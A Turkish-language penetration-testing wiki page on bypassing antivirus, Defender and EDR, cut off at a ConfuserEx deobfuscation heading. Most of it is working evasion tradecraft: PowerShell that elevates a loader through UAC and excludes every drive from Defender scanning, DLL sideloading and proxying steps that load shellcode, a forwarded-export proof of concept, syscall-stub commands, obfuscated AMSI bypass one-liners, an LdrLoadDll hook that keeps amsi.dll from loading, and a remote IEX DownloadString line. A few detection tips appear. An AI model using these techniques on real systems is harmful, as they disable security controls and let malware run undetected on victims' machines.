# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p)** tarafından yazılmıştır!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durduran bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durduran bir araç.
- [Yöneticiyseniz Defender'ı devre dışı bırakın](basic-powershell-for-pentesters/README.md)

### Defender'a müdahale etmeden önce installer tarzı UAC tuzağı

Oyun hilesi gibi görünen herkese açık loader'lar, genellikle imzasız Node.js/Nexe installer'ları olarak dağıtılır. Bu installer'lar önce **kullanıcıdan yükseltme ister**, ancak bundan sonra Defender'ı etkisiz hale getirir. İşleyiş basittir:

1. `net session` ile yönetici bağlamını kontrol eder. Komut yalnızca çağıran taraf yönetici haklarına sahipse başarılı olur; başarısızlık, loader'ın standart kullanıcı olarak çalıştığını gösterir.
2. Özgün komut satırını korurken beklenen UAC onay istemini tetiklemek için kendini hemen `RunAs` fiiliyle yeniden başlatır.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Kurbanlar zaten “crack’li” yazılım yüklediklerine inandığından, istem genellikle kabul edilir ve böylece malware, Defender’ın ilkesini değiştirmek için ihtiyaç duyduğu hakları elde eder.<sup>[[26]](#references)</sup>

### Her sürücü harfi için kapsamlı `MpPreference` istisnaları

Yetki yükseltildikten sonra GachiLoader tarzı zincirler, hizmeti doğrudan devre dışı bırakmak yerine Defender’ın kör noktalarını en üst düzeye çıkarır. Loader önce GUI watchdog’unu sonlandırır (`taskkill /F /IM SecHealthUI.exe`), ardından her kullanıcı profilinin, sistem dizininin ve çıkarılabilir diskin taranamaz hâle gelmesi için **son derece kapsamlı istisnalar** ekler:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Önemli gözlemler:

- Döngü, bağlı tüm dosya sistemlerini (D:\, E:\, USB bellekler vb.) tarar; bu nedenle diskin herhangi bir yerine bırakılan **gelecekteki payload’lar yok sayılır**.
- `.sys` uzantısının hariç tutulması ileriye dönük bir önlemdir: saldırganlar, Defender’a tekrar dokunmadan daha sonra imzasız sürücüler yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır. Böylece sonraki aşamalar, UAC’yi yeniden tetiklemeden hariç tutmaların kalıcı olduğunu doğrulayabilir veya bunları genişletebilir.

Hiçbir Defender hizmeti durdurulmadığından, basit durum denetimleri gerçek zamanlı inceleme bu yolları hiç kontrol etmese bile “antivirus active” bildirmeye devam eder.<sup>[[26]](#references)</sup>

## **AV Evasion Metodolojisi**

Günümüzde AV’ler bir dosyanın kötü amaçlı olup olmadığını kontrol etmek için farklı yöntemler kullanır: statik algılama, dinamik analiz ve daha gelişmiş EDR’lerde davranış analizi.

### **Statik algılama**

Statik algılama; bir binary veya betikte bilinen kötü amaçlı dizeleri ya da bayt dizilerini işaretleyerek ve dosyanın kendisinden bilgi çıkararak (ör. dosya açıklaması, şirket adı, dijital imzalar, simge, checksum vb.) gerçekleştirilir. Bu nedenle bilinen herkese açık araçları kullanmak yakalanmanızı kolaylaştırabilir; çünkü bu araçlar muhtemelen analiz edilmiş ve kötü amaçlı olarak işaretlenmiştir. Bu tür algılamayı aşmanın birkaç yolu vardır:

- **Şifreleme**

Binary’yi şifrelerseniz AV’nin programınızı algılaması mümkün olmaz; ancak programın şifresini çözüp bellekte çalıştıracak bir tür loader’a ihtiyacınız olur.

- **Obfuscation**

Bazen AV’yi aşmak için binary’nizdeki veya betiğinizdeki bazı dizeleri değiştirmeniz yeterlidir; ancak gizlemeye çalıştığınız şeye bağlı olarak bu işlem zaman alabilir.

- **Özel araçlar**

Kendi araçlarınızı geliştirirseniz bilinen kötü amaçlı imzalar olmaz; ancak bu çok fazla zaman ve çaba gerektirir.

> [!TIP]
> Windows Defender’ın statik algılamasını kontrol etmenin iyi bir yolu [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanmaktır. Araç, dosyayı birden fazla parçaya böler ve Defender’dan her parçayı ayrı ayrı taramasını ister. Böylece binary’nizde işaretlenen dizeleri veya baytları tam olarak belirleyebilir.

Pratik AV Evasion hakkında bu [YouTube oynatma listesini](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) incelemenizi şiddetle tavsiye ederim.

### **Dinamik analiz**

Dinamik analiz, AV’nin binary’nizi bir sandbox’ta çalıştırıp kötü amaçlı etkinlikleri izlemesidir (ör. tarayıcınızın parolalarını çözmeye ve okumaya çalışması, LSASS üzerinde minidump alması vb.). Bu kısmı aşmak biraz daha zor olabilir, ancak sandbox’lardan kaçınmak için yapabileceğiniz bazı şeyler şunlardır:

- **Çalıştırmadan önce bekleme** Nasıl uygulandığına bağlı olarak bu, AV’nin dinamik analizini aşmanın harika bir yolu olabilir. AV’lerin, kullanıcı iş akışını kesintiye uğratmamak için dosyaları tarayacakları süre çok kısadır; bu nedenle uzun süre beklemek binary analizini aksatabilir. Sorun şu ki, birçok AV sandbox’ı uygulama biçimine bağlı olarak beklemeyi atlayabilir.
- **Makinenin kaynaklarını kontrol etme** Sandbox’larda genellikle kullanılabilecek çok az kaynak bulunur (ör. < 2GB RAM); aksi hâlde kullanıcının makinesini yavaşlatabilirler. Burada oldukça yaratıcı da olabilirsiniz; örneğin CPU sıcaklığını veya fan hızlarını kontrol edebilirsiniz. Sandbox’ta her şey uygulanmış olmayabilir.
- **Makineye özgü kontroller** İş istasyonu "contoso.local" etki alanına katılmış bir kullanıcıyı hedeflemek istiyorsanız, bilgisayarın etki alanının belirttiğinizle eşleşip eşleşmediğini kontrol edebilirsiniz. Eşleşmiyorsa programınızdan çıkabilirsiniz.

Microsoft Defender’ın Sandbox bilgisayar adının HAL9TH olduğu ortaya çıktı. Bu nedenle, çalıştırmadan önce kötü amaçlı yazılımınızda bilgisayar adını kontrol edebilirsiniz. Ad HAL9TH ise Defender’ın sandbox’ındasınız demektir; bu durumda programınızdan çıkabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox’lara karşı koymak için [@mgeeky](https://twitter.com/mariuszbit) tarafından paylaşılan diğer bazı yararlı ipuçları:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Bu yazıda daha önce de belirttiğimiz gibi, **herkese açık araçlar** er ya da geç **algılanır**. Bu nedenle kendinize şu soruyu sormalısınız:

Örneğin, LSASS’tan veri dökmek istiyorsanız **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS’tan veri döken başka bir proje kullanabilir misiniz?

Muhtemelen doğru yanıt ikincisidir. Örnek olarak mimikatz’ı ele alırsak, AV’ler ve EDR’ler tarafından en çok işaretlenen kötü amaçlı yazılımlardan biridir. Projenin kendisi harika olsa da AV’leri aşmak için onunla çalışmak tam bir kâbustur. Bu nedenle, gerçekleştirmeye çalıştığınız iş için alternatifleri araştırın.

> [!TIP]
> Payload’larınızı kaçınma amacıyla değiştirirken Defender’da **otomatik örnek gönderimini kapattığınızdan** emin olun. Ayrıca uzun vadede kaçınma sağlamak istiyorsanız lütfen **VIRUSTOTAL’A YÜKLEMEYİN**. Payload’ınızın belirli bir AV tarafından algılanıp algılanmadığını kontrol etmek istiyorsanız AV’yi bir VM’ye kurun, otomatik örnek gönderimini kapatmayı deneyin ve sonuçtan memnun kalana kadar testlerinizi orada yapın.

## EXE’ler ve DLL’ler

Mümkün olduğunda kaçınma için her zaman **DLL kullanmaya öncelik verin**. Deneyimlerime göre DLL dosyaları genellikle **çok daha az algılanır** ve incelenir; dolayısıyla payload’ınızın DLL olarak çalışmasını sağlayacak bir yolu varsa, bu bazı durumlarda algılanmaktan kaçınmak için kullanabileceğiniz çok basit bir yöntemdir.

Bu görselde görebileceğimiz gibi, Havoc’un DLL Payload’ı antiscan.me’de 4/26 algılama oranına sahipken EXE payload’ının algılama oranı 7/26’dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me üzerinde normal bir Havoc EXE payload’ı ile normal bir Havoc DLL karşılaştırması</p></figcaption></figure>

Şimdi DLL dosyalarıyla çok daha gizli çalışmanızı sağlayacak bazı yöntemleri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, kurban uygulamayı ve kötü amaçlı payload’ları yan yana konumlandırarak loader’ın kullandığı DLL arama sırasından yararlanır.

DLL Sideloading’e açık programları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell betiğiyle kontrol edebilirsiniz:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e açık programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıktılar.

**DLL Hijackable/Sideloadable programları kendiniz araştırmanızı** şiddetle tavsiye ederim. Bu teknik doğru uygulandığında oldukça gizlidir; ancak herkesçe bilinen DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği adla kötü amaçlı bir DLL yerleştirmek, payload'unuzu yüklemesini sağlamaz; çünkü program bu DLL içinde bazı belirli işlevlerin bulunmasını bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adlı başka bir teknik kullanacağız.

**DLL Proxying**, programın proxy (ve kötü amaçlı) DLL'ye yaptığı çağrıları orijinal DLL'ye yönlendirir. Böylece programın işlevselliği korunurken payload'unuzun yürütülmesini de sağlayabilirsiniz.

[@flangvik](https://twitter.com/flangvik/) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardı:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz ([SGN](https://github.com/EgeBalci/sgn) ile encode edildi) hem de proxy DLL, [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate aldı! Buna başarılı diyebiliriz.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında daha fazla bilgi edinmek için [S3cur3Th1sSh1t'ın twitch VOD'unu](https://www.twitch.tv/videos/1644171543) ve ayrıca [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG_WNpE) izlemenizi **şiddetle tavsiye ederim**. Bu videolar, burada ele aldıklarımızı çok daha derinlemesine anlatıyor.

### Forwarded Exports'u Kötüye Kullanma (ForwardSideLoading)

Windows PE modülleri, aslında "forwarder" olan fonksiyonları export edebilir: export girdisi, koda işaret etmek yerine `TargetDll.TargetFunc` biçiminde bir ASCII string içerir. Bir çağıran export'u çözümlerken Windows loader şunları yapar:

- Henüz yüklenmemişse `TargetDll`'i yükler
- `TargetFunc`'ı buradan çözümler

Anlaşılması gereken temel davranışlar:
- `TargetDll` bir KnownDLL ise korumalı KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll` bir KnownDLL değilse, forward çözümlemesini yapan modülün dizinini de içeren normal DLL arama sırası kullanılır.

Bu, dolaylı bir sideloading primitive'i sağlar: fonksiyonu KnownDLL olmayan bir modül adına yönlendirilen export'u bulunan imzalı bir DLL bulun, ardından bu imzalı DLL ile saldırganın kontrolündeki ve yönlendirilen hedef modülle aynı adı taşıyan bir DLL'yi aynı dizine koyun. Forwarded export çağrıldığında loader forward'ı çözümler ve DLL'nizi aynı dizinden yükleyerek DllMain'inizi çalıştırır.<sup>[[13]](#references)</sup>

Windows 11'de gözlemlenen örnek:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` bir KnownDLL değildir, bu nedenle normal arama sırasına göre bulunur.

PoC (kopyala-yapıştır):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir NCRYPTPROV.dll bırakın. Code execution elde etmek için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için forward edilen fonksiyonu uygulamanız gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) İmzalı bir LOLBin ile yönlendirmeyi tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Gözlemlenen davranış:
- rundll32 (imzalı), side-by-side `keyiso.dll` dosyasını (imzalı) yükler
- `KeyIsoSetAuditingInterface` çözümlenirken loader, `NCRYPTPROV.SetAuditingInterface` yönlendirmesini izler
- Ardından loader, `C:\test` konumundaki `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` işlevini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, `DllMain` zaten çalıştıktan sonra "missing API" hatası alırsınız

Hunting ipuçları:
- Hedef modülün KnownDLL olmadığı forwarded export'lara odaklanın. KnownDLL'ler `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forwarded export'ları şu gibi araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Tespit/savunma önerileri:
- LOLBins'in (ör. rundll32.exe) sistem dışı yollardan imzalı DLL'ler yüklemesini ve ardından aynı dizinden aynı temel ada sahip KnownDLLs dışı DLL'leri yüklemesini izleyin
- Şu tür işlem/modül zincirleri için uyarı oluşturun: `rundll32.exe` → sistem dışı `keyiso.dll` → kullanıcı tarafından yazılabilir yollar altındaki `NCRYPTPROV.dll`
- Kod bütünlüğü ilkelerini (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde yazma+çalıştırma iznini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze, askıya alınmış süreçler, doğrudan syscall'lar ve alternatif yürütme yöntemleri kullanarak EDR'leri atlatmaya yönelik bir payload araç setidir`

Freeze'i shellcode'unuzu gizli bir şekilde yüklemek ve çalıştırmak için kullanabilirsiniz.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion bir kedi-fare oyunudur; bugün işe yarayan bir yöntem yarın tespit edilebilir. Bu yüzden asla tek bir araca güvenmeyin ve mümkünse birden fazla evasion tekniğini zincirlemeyi deneyin.

## Direct/Indirect Syscalls & SSN Çözümlemesi (SysWhispers4)

EDR’ler, `ntdll.dll` syscall stub’larına sıklıkla **user-mode inline hook** yerleştirir. Bu hook’ları atlatmak için doğru **SSN**’yi (System Service Number) yükleyen ve hook’lanmış export giriş noktasını çalıştırmadan kernel mode’a geçiş yapan **direct** veya **indirect** syscall stub’ları oluşturabilirsiniz.<sup>[[32]](#references)</sup>

**Çağırma seçenekleri:**
- **Direct (embedded)**: oluşturulan stub’a bir `syscall`/`sysenter`/`SVC #0` talimatı ekler (`ntdll` export’una uğramaz).
- **Indirect**: kernel geçişinin `ntdll` kaynaklı görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget’ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrıda bir havuzdan gadget seçer.
- **Egg-hunt**: diskte statik `0F 05` opcode dizisini bulundurmaz; çalışma zamanında bir syscall dizisini çözümler.

**Hook’lara dayanıklı SSN çözümleme stratejileri:**
- **FreshyCalls (VA sort)**: stub baytlarını okumak yerine syscall stub’larını sanal adreslerine göre sıralayarak SSN’leri çıkarır.
- **SyscallsFromDisk**: temiz bir `\KnownDlls\ntdll.dll` eşler, `.text` bölümünden SSN’leri okur ve ardından eşlemeyi kaldırır (bellek içindeki tüm hook’ları atlatır).
- **RecycledGate**: VA-sıralı SSN çıkarımını, stub temiz olduğunda opcode doğrulamasıyla birleştirir; hook tespit edilirse VA çıkarımına geri döner.
- **HW Breakpoint**: `syscall` talimatına DR0 ayarlar ve hook’lanmış baytları ayrıştırmadan, çalışma zamanında `EAX` içindeki SSN’yi yakalamak için bir VEH kullanır.

SysWhispers4 kullanım örneği:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" tehdidini önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu. Bu nedenle, payload'ları bir şekilde **doğrudan bellekte** çalıştırabilirseniz AV bunu önlemek için hiçbir şey yapamıyordu; çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir:

- User Account Control veya UAC (EXE, COM, MSI ya da ActiveX kurulumunun yükseltilmesi)
- PowerShell (script'ler, etkileşimli kullanım ve dinamik kod değerlendirmesi)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA makroları

Antivirüs çözümlerinin script içeriğini şifrelenmemiş ve gizlenmemiş bir biçimde sunarak script davranışını incelemesini sağlar.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak Windows Defender'da aşağıdaki uyarıyı oluşturur.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` önekini ve ardından script'in çalıştığı yürütülebilir dosyanın yolunu eklediğine dikkat edin. Bu örnekte bu dosya powershell.exe'dir.

Diske herhangi bir dosya bırakmadık, ancak AMSI nedeniyle yine de bellekte yakalandık.

Ayrıca, **.NET 4.8** sürümünden itibaren C# kodu da AMSI üzerinden çalıştırılır. Bu, bellekte çalıştırma için `Assembly.Load(byte[])` kullanımını da etkiler. Bu nedenle, AMSI'den kaçınmak amacıyla bellekte çalıştırma yaparken daha eski .NET sürümlerini (ör. 4.7.2 veya altı) kullanmanız önerilir.

AMSI'yi atlatmanın birkaç yolu vardır:

- **Obfuscation**

AMSI çoğunlukla statik tespit yöntemlerini kullandığından, yüklemeye çalıştığınız script'leri değiştirmek tespitten kaçınmak için iyi bir yöntem olabilir.

Ancak AMSI, birden fazla katmanı olsa bile script'lerin obfuscation'ını kaldırabilir. Bu nedenle, nasıl uygulandığına bağlı olarak obfuscation kötü bir seçenek olabilir. Bu da tespitten kaçınmayı pek kolay olmayan bir hâle getirir. Yine de bazen birkaç değişken adını değiştirmeniz yeterli olur; bu, bir içeriğin ne ölçüde işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, PowerShell (ayrıca cscript.exe, wscript.exe vb.) işlemine bir DLL yüklenerek uygulandığından, ayrıcalıksız bir kullanıcı olarak çalışırken bile kolayca kurcalanabilir. AMSI uygulamasındaki bu kusur nedeniyle araştırmacılar, AMSI taramasından kaçınmak için birden fazla yöntem buldu.

**Forcing an Error**

AMSI başlatma işleminin başarısız olmasını zorlamak (`amsiInitFailed`), geçerli işlem için tarama başlatılmamasına neden olur. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklanmış ve Microsoft, daha yaygın kullanılmasını önlemek için bir imza geliştirmiştir.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

PowerShell kodunun tek bir satırı, AMSI'yi mevcut PowerShell işlemi için kullanılamaz hâle getirmeye yetti. Bu satır elbette AMSI tarafından tespit edildiğinden, bu tekniği kullanmak için bazı değişiklikler yapmak gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş bir AMSI bypass.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind, this will probably get flagged once this post comes out, so you should not publish any code if your plan is to stay undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and involves finding the address of the "AmsiScanBuffer" function in amsi.dll (responsible for scanning user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG. This way, the result of the actual scan will be 0, which is interpreted as a clean result.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) sayfasını okuyun.

There are also many other techniques used to bypass AMSI with powershell. Learn more about them on [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and in [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### amsi.dll yüklenmesini önleyerek AMSI'yi engelleme (LdrLoadDll hook)

AMSI, yalnızca `amsi.dll` mevcut sürece yüklendikten sonra başlatılır. Dilden bağımsız, sağlam bir bypass yöntemi; `ntdll!LdrLoadDll` üzerinde, istenen modül `amsi.dll` olduğunda hata döndüren bir user-mode hook yerleştirmektir. Böylece AMSI hiçbir zaman yüklenmez ve bu süreç için tarama yapılmaz.<sup>[[23]](#references)</sup>

Uygulama taslağı (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve özel loader'lar dahil, AMSI'yi yükleyecek tüm yöntemlerde çalışır.
- Uzun komut satırı izlerini önlemek için script'leri stdin üzerinden göndermekle birlikte kullanın (`PowerShell.exe -NoProfile -NonInteractive -Command -`).
- LOLBin'ler aracılığıyla çalıştırılan loader'larda kullanıldığı görülmüştür (ör. `DllRegisterServer` çağıran `regsvr32`).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** aracı da AMSI'yi bypass etmek için script üretir.
**[https://amsibypass.com/](https://amsibypass.com/)** aracı da rastgele oluşturulan kullanıcı tanımlı fonksiyon, değişken ve karakter ifadeleriyle imza tespitinden kaçınan; ayrıca imza tespitinden kaçınmak için PowerShell anahtar sözcüklerindeki karakterlerin büyük/küçük harf biçimini rastgele değiştiren, AMSI'yi bypass etmeye yönelik script üretir.

**Tespit edilen imzayı kaldırma**

Mevcut process'in belleğindeki tespit edilen AMSI imzasını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçlar kullanabilirsiniz. Bu araç, mevcut process'in belleğini AMSI imzası için tarar ve ardından imzayı NOP talimatlarıyla üzerine yazarak bellekten etkili bir şekilde kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**Powershell sürüm 2'yi kullanın**
PowerShell sürüm 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging, bir sistemde çalıştırılan tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Denetim ve sorun giderme amacıyla faydalı olabilir, ancak **tespit edilmekten kaçınmak isteyen saldırganlar için bir sorun da oluşturabilir**.

PowerShell logging'i atlatmak için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakın**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **PowerShell sürüm 2'yi kullanın**: PowerShell sürüm 2'yi kullanırsanız AMSI yüklenmez; böylece betiklerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Yönetilmeyen bir PowerShell oturumu kullanın**: `powershell.exe`'yi başlatmadan PowerShell'i barındırmak için [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobalt Strike'ın `powerpick` komutunda kullanılan yaklaşım). Bu, özellikle `powershell.exe` sürecine bağlı denetimleri atlatır; ancak AMSI'yi, Script Block Logging'i veya diğer tüm PowerShell savunmalarını kendiliğinden devre dışı bırakmaz. Kapsam, çalışma zamanına ve host uygulamasına bağlıdır.


## Obfuscation

> [!TIP]
> Birkaç obfuscation tekniği verileri şifrelemeye dayanır; bu da binary'nin entropisini artırarak AV'lerin ve EDR'ların onu tespit etmesini kolaylaştırır. Buna dikkat edin ve şifrelemeyi yalnızca kodunuzun hassas olan veya gizlenmesi gereken belirli bölümlerine uygulamayı değerlendirin.

### ConfuserEx Korumalı .NET Binary'lerinin Deobfuscation İşlemi

ConfuserEx 2 (veya ticari fork'larını) kullanan malware'i analiz ederken, decompiler'ları ve sandbox'ları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı, sonrasında dnSpy veya ILSpy gibi araçlarda C#'a decompile edilebilecek, **neredeyse orijinal IL'yi** güvenilir biçimde geri yükler.<sup>[[10]](#references)</sup>

